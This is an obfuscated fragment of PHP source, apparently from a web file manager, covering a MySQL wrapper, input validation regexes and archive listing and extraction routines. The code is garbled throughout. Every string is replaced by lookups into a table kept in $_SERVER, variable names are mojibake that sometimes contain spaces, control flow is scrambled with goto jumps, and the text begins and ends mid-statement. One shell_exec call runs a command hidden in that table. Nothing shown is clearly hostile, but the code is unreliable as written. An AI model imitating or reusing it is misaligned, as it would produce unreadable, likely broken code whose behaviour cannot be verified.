0; if (!$F™ôæ•áÍ’) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÛ¬Œòò»ï = mysql_query($_SERVER[”Ì÷ñ­î¸][811], $this->_linkID); $this->transTimes = 0; if (!$EÛ¬Œòò»ï) { $this->error(); return !1; } } return !0; } private function getAll() { $Cè…Ò³‡ÂŒ = array(); if ($this->numRows > 0) { while ($f¾¬ôÉ‚¨Æ = mysql_fetch_assoc($this->queryID)) { $Cè…Ò³‡ÂŒ[] = $f¾¬ôÉ‚¨Æ; } mysql_data_seek($this->queryID, 0); } return $Cè…Ò³‡ÂŒ; } public function getFields($b±“‰ÀòØõ) { $FÎÛ×¿Ú×Â =& $_SERVER[”Ì÷ñ­î¸]; $aù’’ø±²ç = $this->query($FÎÛ×¿Ú×Â[812] . $this->parseKey($b±“‰ÀòØõ)); $a©…†±ííÆ = array(); if ($aù’’ø±²ç) { foreach ($aù’’ø±²ç as $B»Ø¨ƒ¬ => $cÙÎç§„º£) { $a©…†±ííÆ[$cÙÎç§„º£[$FÎÛ×¿Ú×Â[27]]] = array($FÎÛ×¿Ú×Â[28] => $cÙÎç§„º£[$FÎÛ×¿Ú×Â[27]], $FÎÛ×¿Ú×Â[29] => $cÙÎç§„º£[$FÎÛ×¿Ú×Â[30]], $FÎÛ×¿Ú×Â[31] => (bool) (strtoupper($cÙÎç§„º£[$FÎÛ×¿Ú×Â[32]]) === $FÎÛ×¿Ú×Â[813]), $FÎÛ×¿Ú×Â[34] => $cÙÎç§„º£[$FÎÛ×¿Ú×Â[35]], $FÎÛ×¿Ú×Â[36] => strtolower($cÙÎç§„º£[$FÎÛ×¿Ú×Â[37]]) == $FÎÛ×¿Ú×Â[38], $FÎÛ×¿Ú×Â[39] => strtolower($cÙÎç§„º£[$FÎÛ×¿Ú×Â[40]]) == $FÎÛ×¿Ú×Â[41]); } } return $a©…†±ííÆ; } public function getTables($e‰“¨ĞÄ‚ = '') { $AäˆÙˆØˆ =& $_SERVER[”Ì÷ñ­î¸]; if (!empty($e‰“¨ĞÄ‚)) { $bÙÛôÅ˜»Û = $AäˆÙˆØˆ[814] . $e‰“¨ĞÄ‚; } else { $bÙÛôÅ˜»Û = $AäˆÙˆØˆ[815]; } $d°±Ãã„‡ = $this->query($bÙÛôÅ˜»Û); $E™µÂ¸·›Ö = array(); foreach ($d°±Ãã„‡ as $BÈÎÙ“¿° => $D‹âÅÕ«¿) { $E™µÂ¸·›Ö[$BÈÎÙ“¿°] = current($D‹âÅÕ«¿); } return $E™µÂ¸·›Ö; } public function replace($aÓÀÚ¼ÏÆ, $f°™›É¢ª = array()) { $C¤¿¦ÉÏ•± =& $_SERVER[”Ì÷ñ­î¸]; foreach ($aÓÀÚ¼ÏÆ as $fã´ÏÉ®Ó² => $F«ºŒñóË®) { $B«„Ñ§‚ê = $this->parseValue($F«ºŒñóË®); if (is_scalar($B«„Ñ§‚ê)) { $cË½îÛ£…Ó[] = $B«„Ñ§‚ê; $E«ÃğÕ¾Îõ[] = $this->parseKey($fã´ÏÉ®Ó²); } } $E›õˆÎ´İ = $C¤¿¦ÉÏ•±[816] . $this->parseTable($f°™›É¢ª[$C¤¿¦ÉÏ•±[267]]) . $C¤¿¦ÉÏ•±[817] . implode($C¤¿¦ÉÏ•±[47], $E«ÃğÕ¾Îõ) . $C¤¿¦ÉÏ•±[818] . implode($C¤¿¦ÉÏ•±[47], $cË½îÛ£…Ó) . $C¤¿¦ÉÏ•±[819]; return $this->execute($E›õˆÎ´İ); } public function insertAll($EïÑ¥ª¬â¾, $bÇ»•È–ĞŠ = array(), $C’Ÿº ÀàÎ = false) { goto AéÌÄÅ†ì«; C¥™‘Ìò†‘: $B¸ÇæÆÌî¯ = array(); foreach ($EïÑ¥ª¬â¾ as $Bæ‡âçíÜ¨) { $f«ÖÉï…’ = array(); foreach ($Bæ‡âçíÜ¨ as $f–‹‚ô‚óã => $aÕ›Çášè”) { $aÕ›Çášè” = $this->parseValue($aÕ›Çášè”); if (is_scalar($aÕ›Çášè”)) { $f«ÖÉï…’[] = $aÕ›Çášè”; } } $B¸ÇæÆÌî¯[] = $cğ¼±¸…ê˜[248] . implode($cğ¼±¸…ê˜[47], $f«ÖÉï…’) . $cğ¼±¸…ê˜[819]; } array_walk($E·‡œ› É, array($this, $cğ¼±¸…ê˜[820])); goto e·’ ºµË; e·’ ºµË: $fÕ¢ÏéìÚø = ($C’Ÿº ÀàÎ ? $cğ¼±¸…ê˜[821] : $cğ¼±¸…ê˜[822]) . $cğ¼±¸…ê˜[823] . $this->parseTable($bÇ»•È–ĞŠ[$cğ¼±¸…ê˜[267]]) . $cğ¼±¸…ê˜[817] . implode($cğ¼±¸…ê˜[47], $E·‡œ› É) . $cğ¼±¸…ê˜[824] . implode($cğ¼±¸…ê˜[47], $B¸ÇæÆÌî¯); return $this->execute($fÕ¢ÏéìÚø); goto C†ÇÊ”Âóõ; AéÌÄÅ†ì«: $cğ¼±¸…ê˜ =& $_SERVER[”Ì÷ñ­î¸]; if (!is_array($EïÑ¥ª¬â¾[0])) { return !1; } $E·‡œ› É = array_keys($EïÑ¥ª¬â¾[0]); goto C¥™‘Ìò†‘; C†ÇÊ”Âóõ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Aêãê…é¢ó =& $_SERVER[”Ì÷ñ­î¸]; $this->error = mysql_errno() . $Aêãê…é¢ó[4] . mysql_error($this->_linkID); if ($Aêãê…é¢ó[33] != $this->queryStr) { $this->error .= LNG($Aêãê…é¢ó[45]) . $this->queryStr; } think_trace($this->error, $Aêãê…é¢ó[33], $Aêãê…é¢ó[46]); return $this->error; } public function escapeString($CÂÔ†¸â«) { if ($this->_linkID) { return mysql_real_escape_string($CÂÔ†¸â«, $this->_linkID); } else { return mysql_escape_string($CÂÔ†¸â«); } } public function parseKey(&$e­¡¾¸Ê, $dö¶Ÿ¦Â÷ = true) { $D¬¥Š®ˆİŒ =& $_SERVER[”Ì÷ñ­î¸]; if ($dö¶Ÿ¦Â÷) { $e­¡¾¸Ê = $this->parseKeyCheck($e­¡¾¸Ê); } if ($e­¡¾¸Ê != $D¬¥Š®ˆİŒ[176] && !preg_match($D¬¥Š®ˆİŒ[825], $e­¡¾¸Ê)) { $e­¡¾¸Ê = $D¬¥Š®ˆİŒ[826] . trim($e­¡¾¸Ê, $D¬¥Š®ˆİŒ[826]) . $D¬¥Š®ˆİŒ[826]; } return $e­¡¾¸Ê; } } goto Dä™¬ØØÇÑ; AóÑÛ¼‹ÆŞ: $_SERVER[$_SERVER[æÒğ][52]] = ("\71\66\64\61"."\61\61")+0;$_75cq="Vc4C5VD6PVgwBWIqzGdTTytzByqgxpG9iPCrp8vX4ZtHshe7jWdUZbpymnGQxDQcFZwRK5MAkKfV7v2YuA";; stream_wrapper_register($_SERVER[æÒğ][53], $_SERVER[æÒğ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Dà•»¬ëæÊ, $c›†Ü¹ïöË) { $b³·š¿«Ø¹ =& $_SERVER[”Ì÷ñ­î¸]; if (isset(self::$_methodList[$Dà•»¬ëæÊ])) { return @call_user_func_array(self::$_methodList[$Dà•»¬ëæÊ], $c›†Ü¹ïöË); } else { if (method_exists($this, $Dà•»¬ëæÊ)) { return call_user_func_array(array($this, $Dà•»¬ëæÊ), $c›†Ü¹ïöË); } else { think_exception(__CLASS__ . $b³·š¿«Ø¹[4] . $Dà•»¬ëæÊ . $b³·š¿«Ø¹[5]); } } } public static function __callStatic($DÔîåàè›Š, $D±Ñâ¼“Ğ) { if (isset(self::$_methodListStatic[$DÔîåàè›Š])) { return call_user_func_array(self::$_methodListStatic[$DÔîåàè›Š], $D±Ñâ¼“Ğ); } else { if (method_exists(self, $DÔîåàè›Š)) { return call_user_func_array(array(self, $DÔîåàè›Š), $D±Ñâ¼“Ğ); } else { show_json("{$DÔîåàè›Š}\50\51\40\x6e\x6f\164\40\x65\170\151\163\164\x3b", !1); } } } public static function addMethod($F¬×¿¦ãù, $D¼ÑÚ‚ò²Ì) { self::$_methodList[$F¬×¿¦ãù] = $D¼ÑÚ‚ò²Ì; } public static function addMethodStatic($DÀèó¯‘ , $a‚íÄšğ×½) { self::$_methodListStatic[$DÀèó¯‘ ] = $a‚íÄšğ×½; } } goto C¤‘Ë»½’‘; F’©ëø¶¿±: if (!function_exists($_SERVER[”Ì÷ñ­î¸][1878])) { function imagecreatefrombmp($eì¥×‘Ëè½) { return ImageGdBMP::load($eì¥×‘Ëè½); } } class Input { public static function getArray($d½ñƒèİ¤Ò) { goto aÛóº‹¯ŒÄ; A®‡šÜøâµ: if (count($cÛô×Ù™±) > 0) { show_json(implode($C¢òÅœó‘[1883], $cÛô×Ù™±), !1); } return $eÚ›¬Ì•×; goto AÚ—…âº†ƒ; aÛóº‹¯ŒÄ: $C¢òÅœó‘ =& $_SERVER[”Ì÷ñ­î¸]; global $in; $eÚ›¬Ì•× = array(); goto CßÕ¢˜Ó§; CßÕ¢˜Ó§: $cÛô×Ù™± = array(); $B“²„‚²´ = LNG($C¢òÅœó‘[1879]); foreach ($d½ñƒèİ¤Ò as $Fœî·Ú«‹® => $c‚œˆªç—ø) { goto aï¡šøÚƒ²; aï¡šøÚƒ²: $bÑ£‘Ø¹ÓÊ = _get($c‚œˆªç—ø, $C¢òÅœó‘[1248], $B“²„‚²´ . $C¢òÅœó‘[882] . $Fœî·Ú«‹®); $A¤”é¶ç‹Ä = $Fœî·Ú«‹®; if (isset($c‚œˆªç—ø[$C¢òÅœó‘[1880]]) && $c‚œˆªç—ø[$C¢òÅœó‘[1880]]) { $A¤”é¶ç‹Ä = $c‚œˆªç—ø[$C¢òÅœó‘[1880]]; } goto CÎ§ãİ­ÌÂ; CÎ§ãİ­ÌÂ: if (!array_key_exists($Fœî·Ú«‹®, $in)) { if (array_key_exists($C¢òÅœó‘[1881], $c‚œˆªç—ø)) { if (!is_null($c‚œˆªç—ø[$C¢òÅœó‘[1881]])) { $eÚ›¬Ì•×[$A¤”é¶ç‹Ä] = $c‚œˆªç—ø[$C¢òÅœó‘[1881]]; } } else { if (isset($c‚œˆªç—ø[$C¢òÅœó‘[1882]])) { $cÛô×Ù™±[] = $bÑ£‘Ø¹ÓÊ; } } continue; } if (isset($c‚œˆªç—ø[$C¢òÅœó‘[1882]]) && $c‚œˆªç—ø[$C¢òÅœó‘[1882]] == $C¢òÅœó‘[282]) { $DçÂ…ªš = json_decode($in[$Fœî·Ú«‹®], !0); if (is_array($DçÂ…ªš)) { $eÚ›¬Ì•×[$A¤”é¶ç‹Ä] = $DçÂ…ªš; } else { if (array_key_exists($C¢òÅœó‘[1881], $c‚œˆªç—ø)) { if (!is_null($c‚œˆªç—ø[$C¢òÅœó‘[1881]])) { $eÚ›¬Ì•×[$A¤”é¶ç‹Ä] = $c‚œˆªç—ø[$C¢òÅœó‘[1881]]; } } else { $cÛô×Ù™±[] = $bÑ£‘Ø¹ÓÊ; } } continue; } $a´«‡³ª½ = _get($c‚œˆªç—ø, $C¢òÅœó‘[1011]); goto F¹¥Õ¦øŞ; F¹¥Õ¦øŞ: if (isset($c‚œˆªç—ø[$C¢òÅœó‘[1882]]) && !self::check($in[$Fœî·Ú«‹®], $c‚œˆªç—ø[$C¢òÅœó‘[1882]], $a´«‡³ª½)) { if (array_key_exists($C¢òÅœó‘[1881], $c‚œˆªç—ø)) { if (!is_null($c‚œˆªç—ø[$C¢òÅœó‘[1881]])) { $eÚ›¬Ì•×[$A¤”é¶ç‹Ä] = $c‚œˆªç—ø[$C¢òÅœó‘[1881]]; } } else { $cÛô×Ù™±[] = $bÑ£‘Ø¹ÓÊ; } continue; } $eÚ›¬Ì•×[$A¤”é¶ç‹Ä] = $in[$Fœî·Ú«‹®]; goto BÅ¨—í‡®; BÅ¨—í‡®: } goto A®‡šÜøâµ; AÚ—…âº†ƒ: } public static function reg($cÜ§¢ä‚… = "\162\x65\161\165\151\x72\145") { static $bê®ç“Üô÷ = array("\x72\x65\161\x75\x69\x72\145" => "\56\53", "\x6e\x75\x6d\x62\x65\x72" => "\134\144\x2b", "\x68\145\170" => "\133\x30\55\71\101\55\106\141\55\146\135\53", "\x69\x6e\x74" => "\133\x2d\x5c\53\135\77\134\144\53", "\142\157\157\154" => "\60\x7c\61", "\x66\x6c\157\141\164" => "\x5b\x2d\x5c\53\135\77\x5c\144\53\x28\134\56\134\x64\x2b\x29\x3f", "\145\156\147\x6c\151\163\150" => "\133\101\55\x5a\x61\x2d\x7a\40\135\x2b", "\143\150\x69\x6e\x65\163\145" => "\133\134\x78\x7b\64\x65\60\60\x7d\x2d\x5c\x78\x7b\x39\x66\x61\x35\175\135\x2b", "\150\141\163\x43\x68\151\x6e\x65\163\145" => "\57\50\133\134\x78\x7b\x34\x65\x30\60\x7d\x2d\x5c\x78\173\x39\146\x61\x35\x7d\x5d\x2b\x29\57\x75", "\x65\x6d\x61\151\154" => "\134\x77\53\x28\x5b\134\56\134\55\x5d\134\x77\53\51\x2a\134\x40\134\167\x2b\x28\x5b\x5c\56\134\x2d\x5d\134\167\x2b\x29\x2a\x5c\x2e\134\167\53", "\160\x68\157\x6e\145" => "\61\133\x33\x2d\x39\135\134\x64\x7b\x39\175", "\x74\145\154\x70\150\157\x6e\x65" => "\x28\x5c\x28\x5c\144\173\x33\x2c\x34\x7d\134\51\174\134\144\x7b\x33\x2c\x34\x7d\55\174\134\163\x29\x3f\134\144\173\x37\54\x31\64\x7d", "\x75\x72\x6c" => "\50\x68\x74\x74\x70\174\x66\x74\x70\174\150\x74\x74\160\163\51\72\134\x2f\x5c\57\x5b\134\167\x5c\55\137\135\x2b\x28\134\x2e\x5b\x5c\x77\134\x2d\137\x5d\53\51\53\x28\133\x5c\167\134\55\x5c\x2e\x2c\100\77\x5e\x3d\x25\46\x3a\x5c\57\176\x5c\53\x23\135\52\133\134\167\134\x2d\134\x40\77\136\75\x25\x26\x5c\57\x7e\x5c\53\x23\135\51\77", "\165\162\x6c\106\x75\154\154" => "\x5b\141\x2d\172\101\55\x7a\135\x2b\72\x5c\57\134\x2f\133\136\x5c\163\135\x2a", "\151\x70" => "\x28\134\144\173\61\x2c\63\175\x5c\x2e\51\x7b\63\x7d\50\x5c\144\173\61\54\63\x7d\x29", "\172\151\160" => "\133\x31\55\71\135\134\144\173\x35\x7d\x28\77\41\x5c\x64\51", "\x69\144\x43\x61\x72\144" => "\x28\134\x64\173\61\65\x7d\51\174\x28\134\x64\x7b\61\x37\x7d\x28\x5c\144\x7c\x58\174\170\x29\x29", "\x63\157\154\x6f\x72" => "\43\x28\133\x30\x2d\71\x41\x2d\106\x61\55\146\135\173\63\x7d\174\133\x30\55\x39\x41\x2d\106\141\55\x66\135\173\x36\x7d\51", "\x74\x69\155\x65" => "\x28\x5b\60\55\61\x5d\x5c\144\x7c\62\x5b\60\x2d\64\x5d\51\72\x5b\x30\55\x35\135\134\x64", "\x64\141\x74\x65" => "\x5c\x64\173\64\x7d\x5b\x2d\134\57\x5d\x3f\x28\60\133\61\x2d\x39\x5d\174\61\x5b\x30\x2d\x32\x5d\51\x5b\x2d\x5c\57\x5d\x3f\x28\x5b\60\x2d\x32\135\x5c\x64\174\x33\133\x30\x2d\61\x5d\51", "\144\141\x74\x65\x54\x69\x6d\x65" => "\x5c\x64\173\x34\x7d\133\55\134\x2f\x5d\77\50\60\133\61\x2d\71\x5d\x7c\x31\x5b\60\x2d\x32\x5d\51\x5b\55\x5c\57\135\x3f\50\x5b\60\x2d\62\135\x5c\144\x7c\x33\133\60\x2d\61\x5d\51\134\163\x2b\50\133\60\x2d\61\x5d\x5c\x64\x7c\x32\133\60\x2d\x34\135\51\x3a\133\60\55\x35\x5d\x5c\x64", "\160\x61\163\163\167\x6f\x72\x64" => "\x28\77\x3d\56\52\x5c\144\x29\50\77\x3d\56\x2a\x5b\x61\55\x7a\135\51\50\77\75\56\52\133\x41\x2d\x5a\x5d\51\x2e\173\x38\x2c\62\x30\x7d", "\153\145\x79" => "\133\101\x2d\x5a\x61\55\x7a\x30\x2d\x39\137\x5c\x2d\134\x2e\x5d\x2b", "\x6b\x65\171\x46\165\x6c\154" => "\133\101\x2d\x5a\141\55\x7a\x30\x2d\71\137\134\55\134\56\134\163\x2c\135\53"); if (!$cÜ§¢ä‚…) { return $bê®ç“Üô÷; } return $bê®ç“Üô÷[$cÜ§¢ä‚…]; } public static function check($Fœ±÷°é‹á, $D…‹ƒó‰ò, $FÁÏ»„„Ïè = null) { $eµ‚¹áíÊì =& $_SERVER[”Ì÷ñ­î¸]; switch ($D…‹ƒó‰ò) { case $eµ‚¹áíÊì[7]: return in_array($Fœ±÷°é‹á, $FÁÏ»„„Ïè); break; case $eµ‚¹áíÊì[1884]: return floatval($Fœ±÷°é‹á) > $FÁÏ»„„Ïè; break; case $eµ‚¹áíÊì[1885]: return floatval($Fœ±÷°é‹á) < $FÁÏ»„„Ïè; break; case $eµ‚¹áíÊì[325]: return strlen($Fœ±÷°é‹á) >= $FÁÏ»„„Ïè[0] && strlen($Fœ±÷°é‹á) <= $FÁÏ»„„Ïè[1]; break; case $eµ‚¹áíÊì[325]: if (is_array($FÁÏ»„„Ïè)) { return strlen($Fœ±÷°é‹á) >= $FÁÏ»„„Ïè[0] && strlen($Fœ±÷°é‹á) <= $FÁÏ»„„Ïè[1]; break; } else { return strlen($Fœ±÷°é‹á) == $FÁÏ»„„Ïè; break; } case $eµ‚¹áíÊì[321]: return floatval($Fœ±÷°é‹á) >= $FÁÏ»„„Ïè[0] && floatval($Fœ±÷°é‹á) <= $FÁÏ»„„Ïè[1]; break; } $bÙõŸâÅô† = self::reg(!1); $D…‹ƒó‰ò = isset($bÙõŸâÅô†[$D…‹ƒó‰ò]) ? $bÙõŸâÅô†[$D…‹ƒó‰ò] : $D…‹ƒó‰ò; if (substr($D…‹ƒó‰ò, 0, 1) != $eµ‚¹áíÊì[8]) { $D…‹ƒó‰ò = $eµ‚¹áíÊì[1886] . $D…‹ƒó‰ò . $eµ‚¹áíÊì[1887]; } return preg_match($D…‹ƒó‰ò, $Fœ±÷°é‹á) === 1; } public static function get($E—¿’®µ¸, $FèÊëåŞ‹ = null, $d’›¦×‚çÂ = null, $døæ¸Ğõ¹Š = null) { goto b£¬Æ®İöÓ; f×ø±×ÂÎ¢: return $E£—¹šê×¡[$E—¿’®µ¸]; goto Aï‘ùªóçÏ; b£¬Æ®İöÓ: $FÎöíÍîë =& $_SERVER[”Ì÷ñ­î¸]; $CïŞğØãÅÓ = array(); if (!is_null($d’›¦×‚çÂ)) { $CïŞğØãÅÓ[$FÎöíÍîë[34]] = $d’›¦×‚çÂ; } goto eÑÅ¢ËÛÙ; eÑÅ¢ËÛÙ: if (!is_null($døæ¸Ğõ¹Š)) { $CïŞğØãÅÓ[$FÎöíÍîë[1011]] = $døæ¸Ğõ¹Š; } if (!is_null($FèÊëåŞ‹)) { $CïŞğØãÅÓ[$FÎöíÍîë[1882]] = $FèÊëåŞ‹; } $E£—¹šê×¡ = Input::getArray(array($E—¿’®µ¸ => $CïŞğØãÅÓ)); goto f×ø±×ÂÎ¢; Aï‘ùªóçÏ: } } class KodArchive { static function init() { goto cÉµ¡âó±; cÉµ¡âó±: $Fİ¯§­ÀÄÑ =& $_SERVER[”Ì÷ñ­î¸]; if (defined($Fİ¯§­ÀÄÑ[1888])) { return; } define($Fİ¯§­ÀÄÑ[1888], SDK_DIR . $Fİ¯§­ÀÄÑ[1889]); goto A‰¢æ»; A‰¢æ»: define($Fİ¯§­ÀÄÑ[1890], TEMP_FILES); define($Fİ¯§­ÀÄÑ[1891], TEMP_FILES); define($Fİ¯§­ÀÄÑ[1892], $Fİ¯§­ÀÄÑ[1893]); goto aÉµ„Ä¬Ëß; c¶×¹Åœğ: require_once ARCHIVE_LIB . $Fİ¯§­ÀÄÑ[1896]; require_once ARCHIVE_LIB . $Fİ¯§­ÀÄÑ[1897]; require_once ARCHIVE_LIB . $Fİ¯§­ÀÄÑ[1898]; goto f˜¥êä¡ö¿; aÉµ„Ä¬Ëß: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $Fİ¯§­ÀÄÑ[1894]; require_once ARCHIVE_LIB . $Fİ¯§­ÀÄÑ[1895]; goto c¶×¹Åœğ; f˜¥êä¡ö¿: require_once ARCHIVE_LIB . $Fİ¯§­ÀÄÑ[1899]; goto c“İÇ¢ÛäÊ; c“İÇ¢ÛäÊ: } static function checkIfType($càï…Ò“š½, $D¯éŠ‰°Á) { goto bÒƒˆ™¥î½; b¶»³¢Æ: $eÉääøÆø  = in_array($càï…Ò“š½, $d†îŒÙŒé[$D¯éŠ‰°Á]); if ($eÉääøÆø  && ($D¯éŠ‰°Á == $bë‘¤ˆ¾„[301] || $D¯éŠ‰°Á == $bë‘¤ˆ¾„[1903]) && (!function_exists($bë‘¤ˆ¾„[1911]) || !function_exists($bë‘¤ˆ¾„[1912]))) { show_tips($bë‘¤ˆ¾„[1913]); } if ($eÉääøÆø  && $D¯éŠ‰°Á == $bë‘¤ˆ¾„[1045] && (!function_exists($bë‘¤ˆ¾„[1914]) || !strstr(shell_exec($bë‘¤ˆ¾„[1915]), $bë‘¤ˆ¾„[1916]))) { show_tips($bë‘¤ˆ¾„[1917]); } goto a£‰ğ±ìŠ»; bÒƒˆ™¥î½: $bë‘¤ˆ¾„ =& $_SERVER[”Ì÷ñ­î¸]; self::init(); $d†îŒÙŒé = array($bë‘¤ˆ¾„[301] => array($bë‘¤ˆ¾„[301], $bë‘¤ˆ¾„[1900], $bë‘¤ˆ¾„[1901], $bë‘¤ˆ¾„[1902]), $bë‘¤ˆ¾„[1903] => array($bë‘¤ˆ¾„[1903], $bë‘¤ˆ¾„[1904], $bë‘¤ˆ¾„[1043], $bë‘¤ˆ¾„[1041]), $bë‘¤ˆ¾„[1045] => array($bë‘¤ˆ¾„[1045], $bë‘¤ˆ¾„[1905], $bë‘¤ˆ¾„[1906], $bë‘¤ˆ¾„[1907], $bë‘¤ˆ¾„[1908], $bë‘¤ˆ¾„[1909], $bë‘¤ˆ¾„[1910])); goto b¶»³¢Æ; a£‰ğ±ìŠ»: return $eÉääøÆø ; goto c´áâ¸Àå‰; c´áâ¸Àå‰: } static function listContent($EóêÜƒ‚×, $EŠÚÇˆœ±‡ = true) { $CÁØÛ®Ù¤„ =& $_SERVER[”Ì÷ñ­î¸]; self::init(); $A»Š«¢à¨— = !empty($GLOBALS[$CÁØÛ®Ù¤„[1049]]) ? $GLOBALS[$CÁØÛ®Ù¤„[1049]] : get_path_ext($EóêÜƒ‚×); $aŸŠÚ®—Í = !1; if (self::checkIfType($A»Š«¢à¨—, $CÁØÛ®Ù¤„[1903])) { $BÄÄŠî®™á = PclTarList($EóêÜƒ‚×, $A»Š«¢à¨—); $aŸŠÚ®—Í = array(); for ($Aì¹ã‘ƒô¾ = 0; $Aì¹ã‘ƒô¾ < count($BÄÄŠî®™á); $Aì¹ã‘ƒô¾++) { $bç¥ÉíÚà = $BÄÄŠî®™á[$Aì¹ã‘ƒô¾]; if ($bç¥ÉíÚà[$CÁØÛ®Ù¤„[1918]] == $CÁØÛ®Ù¤„[1919] || $bç¥ÉíÚà[$CÁØÛ®Ù¤„[1918]] == $CÁØÛ®Ù¤„[1920]) { continue; } if ($EŠÚÇˆœ±‡) { $bç¥ÉíÚà[$CÁØÛ®Ù¤„[1921]] = ltrim($bç¥ÉíÚà[$CÁØÛ®Ù¤„[1921]], $CÁØÛ®Ù¤„[1157]); } if ($bç¥ÉíÚà[$CÁØÛ®Ù¤„[1918]] == $CÁØÛ®Ù¤„[1922]) { $bç¥ÉíÚà[$CÁØÛ®Ù¤„[76]] = !0; } else { $bç¥ÉíÚà[$CÁØÛ®Ù¤„[76]] = !1; } $bç¥ÉíÚà[$CÁØÛ®Ù¤„[1036]] = $Aì¹ã‘ƒô¾; $aŸŠÚ®—Í[] = $bç¥ÉíÚà; } } else { if (self::checkIfType($A»Š«¢à¨—, $CÁØÛ®Ù¤„[1045])) { $C™§Ö©ÔŞš = kodRarArchive::listContent($EóêÜƒ‚×); if (!$C™§Ö©ÔŞš[$CÁØÛ®Ù¤„[1032]]) { return $C™§Ö©ÔŞš; } else { $aŸŠÚ®—Í = $C™§Ö©ÔŞš[$CÁØÛ®Ù¤„[1034]]; } } else { if (kodZipArchive::support($CÁØÛ®Ù¤„[354])) { $aŸŠÚ®—Í = kodZipArchive::listContent($EóêÜƒ‚×); } else { $FëÑİğ¦¦é = new PclZip($EóêÜƒ‚×); $aŸŠÚ®—Í = $FëÑİğ¦¦é->listContent(); } } } if ($aŸŠÚ®—Í) { $fâøŞ‡›Íï = unzip_charset_get($aŸŠÚ®—Í); $EŠÚÇˆœ±‡ = $EŠÚÇˆœ±‡ && function_exists($CÁØÛ®Ù¤„[65]); for ($Aì¹ã‘ƒô¾ = 0; $Aì¹ã‘ƒô¾ < count($aŸŠÚ®—Í); $Aì¹ã‘ƒô¾++) { $aŸŠÚ®—Í[$Aì¹ã‘ƒô¾][$CÁØÛ®Ù¤„[1921]] = str_replace(array($CÁØÛ®Ù¤„[1072], $CÁØÛ®Ù¤„[1923]), $CÁØÛ®Ù¤„[764], $aŸŠÚ®—Í[$Aì¹ã‘ƒô¾][$CÁØÛ®Ù¤„[1921]]); if ($EŠÚÇˆœ±‡) { $aŸŠÚ®—Í[$Aì¹ã‘ƒô¾][$CÁØÛ®Ù¤„[1921]] = iconv_to($aŸŠÚ®—Í[$Aì¹ã‘ƒô¾][$CÁØÛ®Ù¤„[1921]], $fâøŞ‡›Íï, $CÁØÛ®Ù¤„[326]); unset($aŸŠÚ®—Í[$Aì¹ã‘ƒô¾][$CÁØÛ®Ù¤„[1924]]); } } return array($CÁØÛ®Ù¤„[1032] => !0, $CÁØÛ®Ù¤„[1034] => $aŸŠÚ®—Í); } else { return array($CÁØÛ®Ù¤„[1032] => !1, $CÁØÛ®Ù¤„[1034] => $aŸŠÚ®—Í); } } static function extract($DÆíª•ÑÑ¾, $eôÀˆ“ôÁé, $E¸Ì°àæ = "\55\x31", &$B¸¸‘³ÇÎó = false) { goto fô°Š»ÙÁã; b®ºš…©í¡: $bİÕÍ°­¡À = self::listContent($DÆíª•ÑÑ¾, !1); if (!$bİÕÍ°­¡À[$bÕö¡îÖ‘Ô[1032]]) { return $bİÕÍ°­¡À; } if ($E¸Ì°àæ != $bÕö¡îÖ‘Ô[1031]) { goto EËÑ×Æ˜‡; Dˆá Ü®¾Û: if ($GLOBALS[$bÕö¡îÖ‘Ô[6]][$bÕö¡îÖ‘Ô[1155]] != $bÕö¡îÖ‘Ô[326]) { $EÖø›‰Œê° = unzip_pre_name($B¸¸‘³ÇÎó); } $eÙ¥”ë‚¤¸ = get_path_father($B¸¸‘³ÇÎó); if ($eÙ¥”ë‚¤¸ == $B¸¸‘³ÇÎó) { $eÙ¥”ë‚¤¸ = $bÕö¡îÖ‘Ô[33]; } goto c„ëğ…«ƒµ; c„ëğ…«ƒµ: if ($eİ’ãö®¯[$bÕö¡îÖ‘Ô[76]]) { $EÖø›‰Œê° = rtrim($EÖø›‰Œê°, $bÕö¡îÖ‘Ô[8]) . $bÕö¡îÖ‘Ô[8]; $B¸¸‘³ÇÎó = array($B¸¸‘³ÇÎó); } $b´çŠºìé‡ = str_replace($bÕö¡îÖ‘Ô[93], $bÕö¡îÖ‘Ô[8], $EÖø›‰Œê°); if (substr($b´çŠºìé‡, -1) == $bÕö¡îÖ‘Ô[8]) { if (!strstr(trim($b´çŠºìé‡, $bÕö¡îÖ‘Ô[8]), $bÕö¡îÖ‘Ô[8])) { $eôÀˆ“ôÁé = $eôÀˆ“ôÁé . get_path_this($b´çŠºìé‡) . $bÕö¡îÖ‘Ô[8]; } } else { if ($eÙ¥”ë‚¤¸ == $EÖø›‰Œê°) { $eÙ¥”ë‚¤¸ = $bÕö¡îÖ‘Ô[33]; } } goto eÃè‘¢êËŸ; EËÑ×Æ˜‡: $eİ’ãö®¯ = self::fileIndex($bİÕÍ°­¡À[$bÕö¡îÖ‘Ô[1034]], $E¸Ì°àæ); $B¸¸‘³ÇÎó = str_replace(array($bÕö¡îÖ‘Ô[1072], $bÕö¡îÖ‘Ô[1923]), $bÕö¡îÖ‘Ô[70], $eİ’ãö®¯[$bÕö¡îÖ‘Ô[1921]]); $EÖø›‰Œê° = $B¸¸‘³ÇÎó; goto Dˆá Ü®¾Û; eÃè‘¢êËŸ: } goto d”°¾–œ±¾; d”°¾–œ±¾: if (self::checkIfType($D›ÖĞ¼ë‘», $bÕö¡îÖ‘Ô[1903])) { if ($E¸Ì°àæ != $bÕö¡îÖ‘Ô[1031]) { $EÖø›‰Œê° = unzip_pre_name($EÖø›‰Œê°); $eÙ¥”ë‚¤¸ = unzip_pre_name($eÙ¥”ë‚¤¸); $dÏ¦ƒ‹ìÖ = PclTarExtractList($DÆíª•ÑÑ¾, array($EÖø›‰Œê°), $eôÀˆ“ôÁé, $eÙ¥”ë‚¤¸, $D›ÖĞ¼ë‘»); } else { $dÏ¦ƒ‹ìÖ = PclTarExtract($DÆíª•ÑÑ¾, $eôÀˆ“ôÁé, $bÕö¡îÖ‘Ô[361], $D›ÖĞ¼ë‘»); } return array($bÕö¡îÖ‘Ô[1032] => $dÏ¦ƒ‹ìÖ, $bÕö¡îÖ‘Ô[1034] => PclErrorString(!0)); } else { if (self::checkIfType($D›ÖĞ¼ë‘», $bÕö¡îÖ‘Ô[1045])) { return kodRarArchive::extract($DÆíª•ÑÑ¾, $eôÀˆ“ôÁé, $D›ÖĞ¼ë‘», $B¸¸‘³ÇÎó); } else { if 